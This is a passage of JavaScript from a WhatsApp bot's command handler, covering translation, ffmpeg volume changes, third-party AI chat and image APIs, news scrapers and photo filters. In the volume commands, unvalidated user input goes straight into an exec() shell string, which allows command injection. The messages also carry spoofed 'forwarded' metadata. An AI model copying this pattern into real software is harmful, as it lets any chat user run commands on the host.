*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: result.text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./T-Media/Oreki.jpg')}, { upload: ThugBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ThugBotInc.relayMessage(m.chat, msgs.message, {})
    } catch (e) {
        return reply(err)
    } 
    }
    break
   case 'volaudio': {
if (!args.join(" ")) return reply(`*Example: ${prefix + command} 10*`)
media = await ThugBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('$Error!*')
jadie = fs.readFileSync(rname)
ThugBotInc.sendMessage(frommeky, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return reply(`*Example: ${prefix + command} 10*`)
media = await ThugBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('*Error!*')
jadie = fs.readFileSync(rname)
ThugBotInc.sendMessage(frommeky, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break               
case 'costume-ai': {
	if (!text) return reply(`*Example : ${prefix + command} how to make girl pregnant*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt-logic?q=${text}&logic=${text}&realtime=true`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Costume AI\n\n${gpt.data.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./T-Media/Oreki.jpg')}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("*Error*")
}
}
    break
    case 'herc-ai': {
	if (!text) return reply(`*Example : ${prefix + command} how to make girl pregnant*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-chat?model=v3&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI\n\n${gpt.result.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./T-Media/Oreki.jpg')}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("*Error*")
}
}
    break
    case 'hercaiv1': {
	if (!text) return reply(`*Example : ${prefix + command} a girl singing in public*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v1&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI V1\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("*Error*")
}
}
    break
    case 'hercai-cartoon': {
	if (!text) return reply(`*Example : ${prefix + command} a girl singing in public*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v3&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Cartoon\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("*Error*")
}
}
    break
    case 'hercai-animefy': {
	if (!text) return reply(`*Example : ${prefix + command} a girl singing in public*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=animefy&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Animefy\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'hercai-lexica': {
	if (!text) return reply(`*Example : ${prefix + command} a girl singing in public*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=lexica&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Lexica\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("*Error*")
}
}
    break
    case 'hercai-prodia': {
	if (!text) return reply(`*Example : ${prefix + command} a girl singing in public*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=prodia&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Prodia\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("*Error*")
}
}
    break
    case 'hercai-simurg': {
	if (!text) return reply(`*Example : ${prefix + command} a girl singing in public*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=simurg&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Simurg\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("*Error*")
}
}
    break
    case 'hercai-raava': {
	if (!text) return reply(`*Example : ${prefix + command} a girl singing in public*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=raava&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Raava\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'hercai-shonin': {
	if (!text) return reply(`*Example : ${prefix + command} a girl singing in public*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=shonin&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Shonin\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("*Error*")
}
}
    break
    case 'realistic': 
case '3dmodel': {
    if (!text) return reply(`*Example: ${prefix + command} blue sky*`);

    // Cooldown logic
    let currentTime = Date.now();
    if (currentTime - lastUsed < 10000) {
        return reply("*Cooldown 10 seconds, try again later*");
    }
    lastUsed = currentTime;

    try {
        // Define negative prompts
        const negative = 'ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers, adult, naked, 18+';

        // Fetch AI-generated image from API
        const response = await fetch(`https://itzpire.com/ai/${command}?prompt=${encodeURIComponent(text)}`);
        const gpt = await response.json();

        if (!gpt?.result) return reply(`*Failed to fetch the result. Try again later.*`);

        // Generate WhatsApp message content
        const media = await prepareWAMessageMedia(
            { image: { url: gpt.result } },
            { upload: ThugBotInc.waUploadToServer }
        );

        const message = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `> ${command} AI\n\n_*Here is the result for: ${text}*_`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            ...media,
                            hasMediaAttachment: true
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    "name": "quick_reply",
                                    "buttonParamsJson": JSON.stringify({
                                        display_text: "Nice 👀",
                                        id: ""
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender],
                            forwardingScore: 999,
                            isForwarded: true
                        }
                    })
                }
            }
        });

        // Send the message
        await ThugBotInc.relayMessage(m.chat, message.message, {
            messageId: message.key.id
        });

    } catch (error) {
        console.error(error);
        reply(`*Error occurred: ${error.message}. Please try again later.*`);
    }
    break;
}
   
                
    case 'guru-ai': {
	if (!text) return reply(`*Example : ${prefix + command} how to make girl pregnant*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/degreeGuru?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Guru AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./T-Media/Oreki.jpg')}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("*Error*")
}
}
    break
    case 'emi-ai': {
	if (!text) return reply(`*Example : ${prefix + command} a girl singing in public*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/emi?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Emi AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("*Error*<")
}
}
    break
    case 'claude-ai': {
	if (!text) return reply(`*Example : ${prefix + command} how to make girl pregnant*`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/claude?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Claude AI\n\n${gpt.result.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./T-Media/Oreki.jpg')}, { upload: ThugBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ThugBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
      case 'fajar-news': {
        let res = await FajarNews();
        let no = 0;
        let teks = "=============\n";
        
        for (let i of res) {
          no += 1;
          teks += `=============\n`;
          teks += `│⭔ ${no.toString()} │⭔\n`;
          teks += `Berita: ${i.berita}\n`;
          teks += `Upload: ${i.berita_diupload}\n`;
          teks += `Jenis: ${i.berita_jenis}\n`;
          teks += `Link: ${i.berita_url}\n`;
        }
        
        teks += "=============";
        ThugBotInc.sendMessage(m.chat, { text: teks }, { quoted: m });
        break
      }
      case 'jalantikus-meme': {
        let res = await JalanTikusMeme();
        let teks = "==============\n";
        teks += `Source: ${res}\n`;
        teks += "==============";
        ThugBotInc.sendMessage(m.chat, { image: { url: res }, caption: teks }, { quoted: m });
        break
      }
            case 'cnbc-news': {
            let res = await CNBCNews()
            let no = 0
            let teks = "=============="
            for (let i of res) {
            no += 1
            teks += `\n│⭔ ${no.toString()} │⭔\n`
            teks += `Berita: ${i.berita}\n`
            teks += `Upload: ${i.berita_diupload}\n`
            teks += `Link: ${i.berita_url}\n`
            }
            teks += "=============="
            ThugBotInc.sendMessage(m.chat, { text: teks }, { quoted : m })
              break
            }           
        case 'indozone-news': {
        let res = await IndozoneNews()
        let no = 0
        let teks = "=============="
        for (let i of res) {
        no += 1
        teks += `\n│⭔ ${no.toString()} │⭔\n`
        teks += `Berita: ${i.berita}\n`
        teks += `Upload: ${i.berita_diupload}\n`
        teks += `Jenis: ${i.berita_jenis}\n`
        teks += `Link: ${i.berita_url}\n`
        }
        teks += "=============="
        ThugBotInc.sendMessage(m.chat, { text: teks }, { quoted : m })
              break
            }
        case 'detik-news': {
        let res = await DetikNews()
        let no = 0
        let teks = "=============="
        for (let i of res) {
        no += 1
        teks += `\n│⭔ ${no.toString()} │⭔\n`
        teks += `Berita: ${i.berita}\n`
        teks += `Upload: ${i.berita_diupload}\n`
        teks += `Link: ${i.berita_url}\n`
        }
        teks += "=============="
        ThugBotInc.sendMessage(m.chat, { text: teks }, { quoted : m })
              break
            }
      case 'kontan-news': {
        let res = await KontanNews();
        let no = 0;
        let teks = "==============\n";
        
        for (let i of res) {
          no += 1;
          teks += `│⭔ ${no.toString()} │⭔\n`;
          teks += `Berita: ${i.berita}\n`;
          teks += `Jenis: ${i.berita_jenis}\n`;
          teks += `Upload: ${i.berita_diupload}\n`;
          teks += `Link: ${i.berita_url}\n\n`;
        }
        
        teks += "==============";
        ThugBotInc.sendMessage(m.chat, { text: teks }, { quoted: m });
        break
      }
      case 'removebg': case 'nobg':{
if (!quoted) return reply(`*Reply to an image with caption ${prefix + command}*`)
if (!/image/.test(mime)) return reply(`*incorrect input*\n*Reply to an image with caption ${prefix + command}*`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/removebg?url=${url}`)
let data = await anu.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: data.result}}, { upload: ThugBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ThugBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tozombie':{
if (!quoted) return reply(`*Reply to an image with caption ${prefix + command}*`)
if (!/image/.test(mime)) return reply(`*Incorrect input*\n*Reply to an image with caption ${prefix + command}*`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: data.url}}, { upload: ThugBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ThugBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'toanime':{
if (!quoted) return reply(`*Reply to an image with caption ${prefix + command}*`)
if (!/image/.test(mime)) return reply(`*Incorrect input*\n*Reply to an image with caption ${prefix + command}*`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let gpt = await (await fetch(`https://itzpire.com/tools/jadianime?url=${url}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url:gpt.result}}, { upload: ThugBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
